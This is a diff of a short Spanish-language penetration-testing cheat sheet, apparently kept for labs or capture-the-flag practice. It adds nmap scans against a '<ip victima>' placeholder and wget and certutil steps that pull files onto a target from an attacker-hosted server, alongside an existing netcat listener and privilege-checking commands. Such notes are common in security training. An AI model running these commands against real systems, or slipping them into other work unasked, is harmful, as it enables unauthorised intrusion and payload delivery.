@@ -1,3 +1,9 @@
+####### identificar puertos abeirtos #######
+nmap -sS -p- --open -min-rate 5000 -n -vvv -Pn <ip victima>  -oG allPorts  //se guarda en formato grepeable para poder extraer los puertos con extractports
+
+####### identificar versiones de los puertos abiertos ######
+nmap -sV -sC -p<puertos separados por ,> -n -v -Pn <ip victima> -oA scan
+
 
 ####### colocarse en escucha ########
 nc -lvnp <puerto>
@@ -15,7 +21,11 @@ python2 windows-exploit-suggester -d (archivo descargado) -i systeminfo.txt
 
 ######## transferir archivos de linux a windows ###########
 //en linux abrir un servidor
-certutil.exe -f -urlcache -split http://<ip atacante>:<puerto>/archivo.extension archivo.extension
+certutil.exe -f -urlcache -split http://<ip que esta enviando el archivo>:<puerto>/archivo.extension archivo.extension
+
+######## transferir archivos de linux a linux ##########
+//abrir servidor
+wget http://<ip que esta enviando el archivo>:<puerto>/archivo.etension -O archivo.extension
 
 ######## saber permisos en linux ########
 permisos sudo: sudo -l
